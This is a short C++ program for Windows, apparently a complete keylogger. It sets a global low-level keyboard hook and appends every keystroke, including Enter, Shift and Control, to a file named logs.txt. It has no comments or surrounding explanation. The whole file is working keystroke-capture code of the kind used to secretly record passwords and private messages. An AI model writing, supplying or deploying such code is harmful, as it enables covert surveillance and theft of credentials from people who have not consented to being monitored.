#include <iostream>
#include <fstream>
#include <windows.h>

void KeyLogger(int key) {
    std::ofstream file("logs.txt", std::ios::app);
    if (key == VK_BACK) {
        file << "[Backspace]\n";
    } else if (key == VK_RETURN) {
        file << "[Enter]\n";
    } else if (key == VK_TAB) {
        file << "[TAB]\n";
    } else if (key == VK_SPACE) {
        file << " ";
    } else if (key == VK_CAPITAL) {
        file << "[CapsLock]\n";
    } else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) {
        file << "[Control]\n";
    } else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {
        file << "[Shift]\n";
    } else if (key >= 'A' && key <= 'Z') {
        file << char(key);
    } else if (key >= '0' && key <= '9') {
        file << char(key);
    } else {
        file << "[" << key << "]\n";
    }
    file.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyInfo = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyInfo->vkCode;
        KeyLogger(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);

    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
    return 0;
}